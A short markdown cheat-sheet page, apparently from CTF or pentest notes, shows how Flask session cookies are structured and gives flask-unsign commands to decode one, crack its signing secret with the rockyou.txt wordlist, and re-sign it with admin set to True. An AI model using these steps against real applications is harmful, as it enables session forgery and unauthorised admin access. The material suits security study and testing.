---
title: Flask
---

## Session cookies
Flask session cookies looks something like this: 
```
eyJhZG1pbiI6ZmFsc2UsInVpZCI6InQxIn0.Y8MWdQ.2GDhtc5YkYsDn6rbJ5BA3XbZmYw
```
Where the first part is base64 encoded data. In this case `{"admin":false,"uid":"t1"}`.

### flask-unsign
To decode, sign and unsign the session cookies, `flask-unsign` can be used.

{{< tabs "flask-unsign" >}}
{{< tab "Decode" >}} 
```Plain
flask-unsign -d -c eyJhZG1pbiI6ZmFsc2UsInVpZCI6InQxIn0.Y8MWdQ.2GDhtc5YkYsDn6rbJ5BA3XbZmYw
```
{{< /tab >}}
{{< tab "Unsign" >}}
```Plain
flask-unsign -u -c eyJhZG1pbiI6ZmFsc2UsInVpZCI6InQxIn0.Y8MWdQ.2GDhtc5YkYsDn6rbJ5BA3XbZmYw
-w rockyou.txt --no-literal-eval
```
{{< /tab >}}
{{< tab "Sign" >}}
```Plain
flask-unsign -S <secret> -s -c "{'admin': True, 'uid': 't1'}"
```
{{< /tab >}}
{{< /tabs >}}
